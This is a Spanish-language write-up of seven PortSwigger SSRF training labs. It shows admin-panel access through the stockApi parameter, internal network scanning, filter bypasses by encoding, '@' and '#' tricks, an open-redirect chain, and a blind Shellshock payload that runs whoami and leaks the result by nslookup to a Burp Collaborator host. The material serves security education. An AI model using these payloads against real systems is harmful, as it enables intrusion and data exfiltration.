---
layout: default
title: "Server-side request forgery - PortSwigger"
permalink: /ssrf-ps/
---

# Server-side request forgery - PortSwigger

Todos los laboratorios posteriormente expuestos los puedes encontrar para resolverlos en el siguiente link.

[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Índice



## 1. Lab: Basic SSRF against the local serve

```
Este laboratorio tiene una función de verificación de stock que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración http://localhost/admin y elimine al usuario carlos.
```

Entonces, lo que haremos será interceptar los paquetes en segundo plano y entrar a uno de los articulos.

![](img1.png)

Entonces buscamos el paquete que envio la solicutd de **Check stock**.

![](img2.png)

Así que lo enviamos al repeater, y a su vez desde el navegador intentamos dirigirnos a **/admin**, para visualizar la respuesta.

![](img3.png)

Como podemos ver se puede acceder con una cuenta de administrador, o tambien de manera local. Entonces en el paquete que enviamos al Repeater, editamos el parametro **stockApi** por **http://localhost/admin**.

![](img4.png)

Y como podemos ver, funcionó la solicitud y a su vez nos envia un link donde podemos eliminar al usuario carlos, así que lo agregamos a nuestra solicitud y lo volvemos a enviar.

![](img5.png)

Lo cual parece que funcionó. Entonces nos dirigimos al home del laboratorio para verificar que completamos el laboratorio.

![](img6.png)

## 2. Lab: Basic SSRF against another back-end system

```
Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, use la función de verificación de existencias para escanear el rango interno  192.168.0.X en busca de una interfaz de administración en el puerto 8080, luego úsela para eliminar el usuario carlos.
```

Entonces, lo que haremos será interceptar los paquetes en segundo plano y entrar a uno de los articulos y verificar el stock presente.

![](img7.png)

Ahora lo que haremos será enviarlo al Intruder, y entonces, hay que planear cual sería el payload que ingresariamos en **stockApi**, como nos hablan de un panel de administracion en el puerto 8080,

```
http://192.168.0.1:8080/admin
```

Entonces realizamos las siguientes configuraciones en el intruder.

![](img8.png)

![](img9.png)

Y le damos en **Start Attack**.

![](img10.png)

Entonces, encontramos que para el payload **227**, nos topamos con un panel de administracion. Entonces enviamos el paquete al repeater, y colocamos el enlace para eliminar a carlos y enviamos el paquete.

![](img11.png)

Ahora revisamos en el home del laboratorio para verificar que lo completamos.

![](img12.png)

## 3. Lab: SSRF with blacklist-based input filter

```
Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración http://localhost/admin y elimine al usuario carlos.

El desarrollador ha implementado dos defensas anti-SSRF débiles que deberá evitar.
```

Entonces, lo que haremos será interceptar los paquetes en segundo plano y entrar a uno de los articulos y verificar el stock presente.

![](img13.png)

Así que ahora lo enviamos al repeater, e intentamos cargar el panel de administracion.

![](img14.png)

Entonces como podemos ver, nos bloquea la solicitud puesto que en su lista negra debe estar el string **127.0.0.1**, entonces lo vamos a reemplazar por **127.1**.

![](img15.png)

Como podemos ver, aun nos bloquea, y debe ser por que **admin** debe ser parte de la lista negra tambien, así que enviamos admin al decoder y aplicamos dos veces **encode URL**.

![](img16.png)

Y el resultado lo reemplazamos en el repeater, y enviamos el paquete.

![](img17.png)

Entonces podemos ver que funcionó, ahora copiamos el recurso **/delete... ** y lo agregamo al parametro **stockApi** para eliminar al usuario **carlos**.

![](img18.png)

Entonces, funcionó el envio. Ahora accedemos al home del laboratorio para verificar que lo completamos.

![](img19.png)

## 4. Lab: SSRF with whitelist-based input filter

```
Este laboratorio tiene una función de verificación de stock que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración http://localhost/admin y elimine al usuario carlos.

El desarrollador ha implementado una defensa anti-SSRF que deberá omitir.
```

Entonces, lo que haremos será interceptar los paquetes en segundo plano y entrar a uno de los articulos y verificar el stock presente y luego lo enviamos al repeater y comprobamos el envio.

![](img20.png)

Ahora lo que haremos será intentar conectarnos a la url **http://localhost/admin**-

![](img21.png)

Entonces, podemos ver qie nos pide que la url contenga **stock.weliketoshop.net**. Entonces, intentaremos usando el truco del **@**.

![](img22.png)

Como podemos ver funciona el **@**, ahora intentaremos reemplazar **malware-url** por **localhost**. y le agregamos un **#** luego de localhost y vemos lo que ocurre.

![](img23.png)

Entonces podemos ver que nos deniega la URL, entonces intentamos usar el mismo metodo que en el laboratorio anterior encodeando dos veces el simbolo **#**.

![](img24.png)

Entonces enviamos el siguiente payload.

![](img25.png)

Y vemos que si interpreta el payload, entonces enviamos el directorio de **/admin**.

![](img26.png)

Entonces podemos ver que funcionó, ahora copiamos el recurso **/delete... ** y lo agregamo al parametro **stockApi** para eliminar al usuario **carlos**.

![](img27.png)

Entonces, funcionó el envio. Ahora accedemos al home del laboratorio para verificar que lo completamos.

![](img28.png)

## 5. Lab: SSRF with filter bypass via open redirection vulnerability

```
Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración http://192.168.0.12:8080/admin y elimine al usuario carlos.

El verificador de acciones se ha restringido para acceder solo a la aplicación local, por lo que primero deberá encontrar una redirección abierta que afecte a la aplicación.
```

Entonces, lo que haremos será interceptar los paquetes en segundo plano y entrar a uno de los articulos y verificar el stock presente y luego lo enviamos al repeater y comprobamos el envio.

![](img29.png)

Ahora, vamos a la pagina del articulo y vemos un enlace el cual dice: **[Next product]** , y luego vemos en el HTTP History.

![](img30.png)

Entonces, tenemos los parametros post:

```
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Y en el paquete anterior, obtenemos el redirect en el parametro **path**.

```
/product/nextProduct?currentProductId=1&path=/product?productId=2
```

Agregamos nuestra url deseada **http://192.168.0.12:8080/admin**.

```
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

Entonces codeamos nuestro payload en el encoder.

![](img31.png)

Lo actualizamos el parametro **stockApi** y enviamos el paquete.

![](img32.png)

Y como vemos si envia el paquete, y carga el panel de administracion, entonces le agregamos el recurso **/delete?username=carlos**.

![](img33.png)

Entonces, enviamos el parametro para esperar la respuesta de que se eliminó el usuario satisfactoriamente.

![](img34.png)

Entonces, funcionó el envio. Ahora accedemos al home del laboratorio para verificar que lo completamos.

![](img35.png)

## 6. Lab: Blind SSRF with out-of-band detection

```
Este sitio utiliza un software de análisis que obtiene la URL especificada en el encabezado Referer cuando se carga una página de producto.

Para resolver el laboratorio, use esta funcionalidad para generar una solicitud HTTP al servidor público de Burp Collaborator.
```

Entonces, buscamos un producto y le hacemos clic, buscamos el paquete de la consulta al producto en el **http history**, y lo enviamos al repeater.

![](img36.png)

Entonces, segun la informacion del laboratorio, existe un SSRF en la cabecera **Referer:** entonces, primero iniciamos el **Burp collaborator client** que se encuentra en la pestaña **Burp**, y le damos clic en **Copy to clipboard**.

```
oyq2dknvpjrf7a872qrgq7bl9cf33s.burpcollaborator.net
```

Entonces, ahora en el Referer, escribimos la url antes obtenida en el burp collaborator y enviamos el paquete.

![](img37.png)

Entonces, podemos ver que al enviar el paquete, el servidor realiza una solicitud HTTP al dominio antes obtenido en el burp collaborator. Ahora revisamos en el home del laboratorio para ver que completamos el laboratorio.

![](img38.png)

## 7. Laboratorio: SSRF ciego con explotación Shellshock

```
Este sitio utiliza un software de análisis que obtiene la URL especificada en el encabezado Referer cuando se carga una página de producto.

Para resolver el laboratorio, use esta funcionalidad para realizar un ataque SSRF ciego contra un servidor interno en el rango 192.168.0.X . En el ataque ciego, use una carga útil de Shellshock contra el servidor interno para filtrar el nombre del usuario del sistema operativo.
```

Realizamos lo mismo que en el laboratorio anterior, y observamos en el burpcollaborator, que el **user-agent** del paquete que enviamos y el que llega al **burp collaborator**.

![](img39.png)

Entonces sabemos que el payload de shellshock que se especifica en el **User-Agent** es el siguiente:

```
() { :; }; /bin/eject
```

Entonces, lo que haremos será ejecutar el programa whoami y enviarlo por una consulta nslookup con el siguiente payload.

```
() { :; }; /usr/bin/nslookup `/usr/bin/whoami`.ebt3zmpikulve14b34lnozf01r7iv7.burpcollaborator.net
```

Ahora, no sabemos cual es la ip objetivo, pero tenemos un rango el cual es: 192.168.0.X, entonces enviamos el paquete al intruder y realizamos la siguiente configuracion.

![](img40.png)

Y luego en **Payloads** especificamos lo siguiente:

![](img41.png)

Y luego hacemos clic en **Start attack**.

![](img42.png)

Pero no nos topamos con ningun resultado entonces intentaremos con el puerto 8080, mejor dicho:

```
Referer: http://192.168.0.§1§:8080/
```

Y lo enviamos de nuevo para ver si obtenemos algun resultado.

![](img43.png)

Y podemos ver como nos salió la consulta dns, donde podemos ver el usuario del sistema operativo. Así que vamos al home del laboratorio y enviamos el nombre del usurio para completar el laboratorio.

![](img44.png)

## CONCLUSION

Los laboratorios de SSRF han sido muy utiles para poder comprender la magnitud de esta vulnerabilidad que puede usarse para una exploracion interna de la red en donde pertenezca el usuario, como tambien para realizar solicitudes a servidores externos usando el servidor vulnerable como intermediario.